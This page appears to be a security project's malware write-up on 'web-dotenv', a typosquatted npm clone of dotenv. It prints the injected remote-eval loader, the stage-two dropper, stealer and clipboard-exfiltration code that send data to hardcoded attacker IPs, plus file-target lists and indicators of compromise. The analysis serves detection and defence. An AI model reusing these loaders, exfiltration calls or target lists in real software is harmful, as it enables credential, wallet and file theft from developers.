@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>web-dotenv: a dotenv clone, plus one function that robs you - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="web-dotenv: a dotenv clone, plus one function that robs you - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>web-dotenv: a dotenv clone, plus one function that robs you</h1>
+    <span class="post-meta">2026-05-26 &middot; npm &middot; web-dotenv</span>
+  </div>
+  <div class="post-body discovery-body">
+    <p><code>dotenv</code> pulls ~50M downloads a week, so <code>web-dotenv</code> — a near-byte-identical clone published from a fresh gmail, <code>repository.url</code> still pointing upstream — only had to be one prefix away. The diff against <code>motdotla/dotenv</code> is one function and one call site in <code>lib/main.js</code>, and the call sits in <code>config()</code>, what every consumer runs on application boot.</p>
+<h2 id="stage-1%3A-the-inserted-function" tabindex="-1"><a class="header-anchor" href="#stage-1%3A-the-inserted-function"><span>Stage 1: the inserted function</span></a></h2>
+<p>One helper, one call wedged into the first line of <code>config()</code>:</p>
+<pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">configfix</span>() {
+  <span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(<span class="tok-str">'CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk='</span>))
+    .<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content); });
+}
+
+<span class="tok-kw">function</span> <span class="tok-fn">config</span> (options) {
+  <span class="tok-com">// fallback to fixed config</span>
+  <span class="tok-fn">configfix</span>();
+  ...
+}
+</code></pre>
+<p>The base64 carries a leading tab — the only nod to obfuscation — and decodes to a jsonkeeper URL whose <code>content</code> field <code>eval</code> runs; with no <code>postinstall</code> hook, the chain fires the first time a code path reaches <code>dotenv.config()</code> and registry scanners see nothing — and the author iterated between versions:</p>
+<ul>
+<li><code>1.0.0</code> (2026-05-22) inlined the entire Stage 2 obfuscator inside <code>configfix()</code></li>
+<li><code>1.0.2</code> (three days later) outsourced it to jsonkeeper for a smaller tarball and a mutable payload</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>supply-chain/install-hook/build/build-system-trojan</code></td>
+<td><code>configfix()</code> injected into the upstream <code>dotenv</code> library init</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/remote-command/protocol/eval-http-response-data</code></td>
+<td><code>eval(r.data.content)</code> on a fetched HTTP body</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>anti-static/obfuscation/encoding/content/malware</code></td>
+<td><code>atob('CWh0dHBz…')</code> masking the Stage-2 URL</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>supply-chain/recon-exfil/npm-install-targeting</code></td>
+<td>Name-prefix lookalike of <code>dotenv</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-2%3A-the-jsonkeeper-loader" tabindex="-1"><a class="header-anchor" href="#stage-2%3A-the-jsonkeeper-loader"><span>Stage 2: the jsonkeeper loader</span></a></h2>
+<p>The bin is 19 KB of <a href="http://obfuscator.io">obfuscator.io</a> output that does exactly two things:</p>
+<pre class="lang-js"><code><span class="tok-fn">execSync</span>(
+  <span class="tok-str">'npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent'</span>,
+  { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() }
+);
+
+<span class="tok-fn">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(
+  <span class="tok-str">'http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb'</span>
+).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
+</code></pre>
+<p><code>--no-save</code> keeps the install out of the manifest and lockfile; the deps land under <code>$TMPDIR/node_modules/</code> where the next stage resolves them. The hex tail is the campaign UID, reappearing in every Stage-3 exfil packet, and <code>socket.io-client</code> is pre-positioned but unused as shipped — wiring for a later iteration.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/remote-command/protocol/eval-http-response-data</code></td>
+<td><code>eval</code> of HTTP body from a hardcoded IP</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>command-and-control/dropper/execution/network-stage/fetch-write-exec</code></td>
+<td>Silent <code>npm install</code> of runtime deps into <code>os.tmpdir()</code> before fetching Stage 3</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>anti-static/obfuscation/tools/js-obfuscator/decoder-loop-keyword-triad</code></td>
+<td><a href="http://Obfuscator.io">Obfuscator.io</a> string-array, decoder, and <code>while(!![])</code> rotation</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>command-and-control/infrastructure/ip-port</code></td>
+<td><code>http://216.126.224.247/</code> hardcoded, no DNS</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-3%3A-stealer-%2B-clipper" tabindex="-1"><a class="header-anchor" href="#stage-3%3A-stealer-%2B-clipper"><span>Stage 3: stealer + clipper</span></a></h2>
+<p>The 110 KB body from <code>216.126.224.247</code> writes two files to <code>os.tmpdir()</code>, detaches them, and also passes each inline as <code>node -e</code> to <code>spawn()</code> as a fallback:</p>
+<pre class="lang-js"><code>fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'scdata'</span>), &lt;stealer&gt;);
+fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'ldata'</span>),  &lt;clipper&gt;);
+<span class="tok-fn">exec</span>(<span class="tok-str">'node scdata'</span>, { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
+<span class="tok-fn">exec</span>(<span class="tok-str">'node ldata'</span>,  { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
+</code></pre>
+<h3 id="scdata-%E2%80%94-the-file-stealer" tabindex="-1"><a class="header-anchor" href="#scdata-%E2%80%94-the-file-stealer"><span><code>scdata</code> — the file stealer</span></a></h3>
+<p><code>scdata</code> walks <code>$HOME</code> (and on Windows every drive from <code>Get-CimInstance Win32_LogicalDisk</code>) for files matching:</p>
+<ul>
+<li>Wallet / crypto: <code>*metamask*</code>, <code>*bitcoin*</code>, <code>*btc*</code>, <code>*solana*</code>, <code>*private key*</code>, <code>*secret phrase*</code>, <code>*.dat</code></li>
+<li>Secrets / config: <code>*.env*</code>, <code>*.pem</code>, <code>*.secret</code>, <code>*.key</code>, <code>*.json</code>, <code>*.yaml</code>, <code>*.yml</code>, <code>*.ini</code>, <code>*.sqlite</code></li>
+<li>Documents: <code>*.pdf</code>, <code>*.docx</code>, <code>*.doc</code>, <code>*.xlsx</code>, <code>*.xls</code>, <code>*.csv</code>, <code>*.txt</code>, <code>*.md</code>, <code>*.rtf</code>, <code>*.odt</code></li>
+</ul>
+<p>…but only inside an allow-list of high-value directories that reads like 2026's dev surface — AI-tool config dirs beside cloud creds, SSH/GPG, and Web3 workspaces — uploading each match as <code>multipart/form-data</code> to bulk-exfil <code>216.126.224.220:5976/upload</code>, one hop from Stage-3 control at <code>.247</code> in the same <a href="http://Tier.Net">Tier.Net</a> <code>/22</code>:</p>
+<pre><code>.aws  .azure  .ssh  .gnupg  .docker  .config  .cache
+.cargo  .rustup  .cocoapods  .gemini  .claude  .cursor
+.vscode  .vscode-server  .windsurf  .pearai  .vue-cli-ui
+.brownie  .move  .sol  .eigent  .devctl  .pm2  .android
+.steam  .snipaste  .yarn  .nvm  .node-gyp  .expo  .next
+</code></pre>
+<h3 id="ldata-%E2%80%94-the-clipboard-watcher" tabindex="-1"><a class="header-anchor" href="#ldata-%E2%80%94-the-clipboard-watcher"><span><code>ldata</code> — the clipboard watcher</span></a></h3>
+<p><code>ldata</code> is a watcher, not a swapper: it polls the clipboard every 750 ms — whatever the developer pastes, including secrets and wallet addresses — and POSTs the deltas to the Stage-2 host's plausible-looking <code>/npm-compiler.log</code>, reading per platform:</p>
+<ul>
+<li>macOS: <code>pbpaste</code></li>
+<li>Windows: <code>powershell -NoProfile -NonInteractive Get-Clipboard</code></li>
+</ul>
+<pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.224.247/npm-compiler.log'</span>, {
+  message: clipboardText,
+  host:    os.<span class="tok-fn">hostname</span>(),
+  uid:     <span class="tok-str">'329f753d052f978a486cdce9896050bb'</span>,
+  t:       <span class="tok-str">'102'</span>
+});
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/dropper/execution/network-stage/obfuscated-node-staged-loader</code></td>
+<td>Obfuscator-decoded <code>require</code> + base64/XOR string decoders + <code>windowsHide</code>-via-expression spawn</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/dropper/execution/network-stage/spawn-node</code></td>
+<td><code>node $TMPDIR/scdata</code> and <code>node $TMPDIR/ldata</code> detached</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>exfiltration/stealer/file/javascript/js-targeted-file-upload-exfil</code></td>
+<td>Sensitive-path filter → <code>216.126.224.220:5976/upload</code> multipart sink</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>exfiltration/stealer/credential/browser/javascript/js-browser-wallet-upload-exfil</code></td>
+<td>Wallet globs (<code>*metamask*</code>, <code>*solana*</code>, <code>*secret phrase*</code>) into an external-IP upload</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>exfiltration/stealer/credential/clipboard/javascript/js-clipboard-exfil-external-ip</code></td>
+<td><code>pbpaste</code> + <code>powershell Get-Clipboard</code> polled every 750 ms, POSTed to a literal IPv4</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>exfiltration/sensitive-data/javascript/js-system-info-exfiltration</code></td>
+<td><code>Get-CimInstance Win32_LogicalDisk</code> drive enumeration sent to C2</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>anti-static/obfuscation/payload/data-file/js-obfuscator-runtime-data-file</code></td>
+<td><code>scdata</code> and <code>ldata</code> themselves: obfuscator loop + <code>decodeURIComponent</code> + <code>function c(b,d)</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>evasion/masquerade/path/log</code></td>
+<td>Exfil URL named <code>/npm-compiler.log</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="why-this-works" tabindex="-1"><a class="header-anchor" href="#why-this-works"><span>Why this works</span></a></h2>
+<p>A verbatim clone whose only diff fires at runtime from <code>config()</code> — not the <code>postinstall</code> every audit flags — with both downstream stages paste-hosted, so the version pinned in a victim's lockfile stays permanently fresh; the <a href="https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6">Fallout report</a> returns malicious at probability 1.0.</p>
+<h2 id="likely-actor" tabindex="-1"><a class="header-anchor" href="#likely-actor"><span>Likely actor</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Publisher</td>
+<td><code>jean_dupont24 &lt;jean.pierre.depont24@gmail.com&gt;</code></td>
+</tr>
+<tr>
+<td>Account created</td>
+<td><code>2026-05-22</code></td>
+</tr>
+<tr>
+<td><code>1.0.0</code> published</td>
+<td><code>2026-05-22T14:15:09Z</code></td>
+</tr>
+<tr>
+<td><code>1.0.2</code> published</td>
+<td><code>2026-05-25T15:05:35Z</code></td>
+</tr>
+<tr>
+<td>Campaign UID</td>
+<td><code>329f753d052f978a486cdce9896050bb</code></td>
+</tr>
+<tr>
+<td>Stage-2 host</td>
+<td><code>jsonkeeper.com/b/VKUNI</code></td>
+</tr>
+<tr>
+<td>Stage-3 host</td>
+<td><code>216.126.224.247</code> (<a href="http://Tier.Net">Tier.Net</a> Technologies LLC)</td>
+</tr>
+<tr>
+<td>Bulk exfil host</td>
+<td><code>216.126.224.220:5976</code> (<a href="http://Tier.Net">Tier.Net</a> Technologies LLC)</td>
+</tr>
+</tbody>
+</table>
+<p>&quot;Jean Dupont&quot; is the French &quot;John Doe&quot; — placeholder name, real gmail — and the signature differs from last week's <code>shinydv412</code> / <code>devcarron</code> IPFS-PE cluster: pure JavaScript, AI-tool–aware targeting, runtime-triggered.</p>
+<p><strong>Update (2026-05-28).</strong> Two days later <a href="/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/">clx-cookieparser</a> turned up running the identical endgame — same two-file stealer pair, same jsonkeeper-plus-<code>/api/service/&lt;hex&gt;</code> delivery, and the byte-for-byte same <code>216.126.224.220:5976/upload</code> sink — and it is attributed to the DPRK's Contagious Interview campaign (FAMOUS CHOLLIMA) by <a href="https://dprk-research.kmsec.uk/">dprk-research.kmsec.uk</a>. The shared sink makes <code>jean_dupont24</code> a Contagious Interview persona, not an independent actor: still a different shop than the IPFS-PE cluster, but the same shop behind BeaverTail and InvisibleFerret.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>web-dotenv@1.0.2</code> (npm), also <code>1.0.0</code></td>
+</tr>
+<tr>
+<td>npm page</td>
+<td><a href="https://www.npmjs.com/package/web-dotenv">npmjs.com/package/web-dotenv</a></td>
+</tr>
+<tr>
+<td>Tarball SHA-256 (1.0.2)</td>
+<td><a href="https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6"><code>6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6</code></a></td>
+</tr>
+<tr>
+<td>Tarball SHA-256 (1.0.0)</td>
+<td><a href="https://lab.atomdrift.org/file/c4f602914de9a106ab65300df233d0f15d29df19237ba3a70f2c86698e0b89c8"><code>c4f602914de9a106ab65300df233d0f15d29df19237ba3a70f2c86698e0b89c8</code></a></td>
+</tr>
+<tr>
+<td><code>lib/main.js</code> SHA-256 (1.0.2)</td>
+<td><a href="https://lab.atomdrift.org/file/5cc30e2db46bb70e043b5f7fdb2d526caa2a4fcf83806c1c08bd6f0a1559ef43"><code>5cc30e2db46bb70e043b5f7fdb2d526caa2a4fcf83806c1c08bd6f0a1559ef43</code></a></td>
+</tr>
+<tr>
+<td>Stage 2 URL</td>
+<td><code>https://www.jsonkeeper.com/b/VKUNI</code> (base64: <code>CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk=</code>)</td>
+</tr>
+<tr>
+<td>Stage 2 SHA-256 (snapshot)</td>
+<td><a href="https://lab.atomdrift.org/file/7e672968591f290c62892d51682432363cf33264f9c6a602088b9b93efbe70bf"><code>7e672968591f290c62892d51682432363cf33264f9c6a602088b9b93efbe70bf</code></a></td>
+</tr>
+<tr>
+<td>Stage 3 URL</td>
+<td><code>http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb</code></td>
+</tr>
+<tr>
+<td>Stage 3 SHA-256 (snapshot)</td>
+<td><a href="https://lab.atomdrift.org/file/bf97b9f78cbbed6e3b7af7240b4f1019d05496f138202262964f7d8a7271fe4f"><code>bf97b9f78cbbed6e3b7af7240b4f1019d05496f138202262964f7d8a7271fe4f</code></a></td>
+</tr>
+<tr>
+<td>Dropped stealer</td>
+<td><code>$TMPDIR/scdata</code> (SHA-256 <a href="https://lab.atomdrift.org/file/7c921e8acabce12825e12a7730912af63d0bed08700996b6e7389b9e96e1238b"><code>7c921e8acabce12825e12a7730912af63d0bed08700996b6e7389b9e96e1238b</code></a>)</td>
+</tr>
+<tr>
+<td>Dropped clipper</td>
+<td><code>$TMPDIR/ldata</code> (SHA-256 <a href="https://lab.atomdrift.org/file/f3c3175bf05ccb6b97e371a451bba5a9d422aa7cfd6dbecb6f58c0cabfa6c5c1"><code>f3c3175bf05ccb6b97e371a451bba5a9d422aa7cfd6dbecb6f58c0cabfa6c5c1</code></a>)</td>
+</tr>
+<tr>
+<td>File exfil C2</td>
+<td><code>http://216.126.224.220:5976/upload</code> (multipart) — identical endpoint reused by <a href="/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/">clx-cookieparser</a> (DPRK)</td>
+</tr>
+<tr>
+<td>Clipboard exfil C2</td>
+<td><code>http://216.126.224.247/npm-compiler.log</code></td>
+</tr>
+<tr>
+<td>Campaign UID</td>
+<td><code>329f753d052f978a486cdce9896050bb</code></td>
+</tr>
+<tr>
+<td>Publisher</td>
+<td><code>jean_dupont24 &lt;jean.pierre.depont24@gmail.com&gt;</code></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
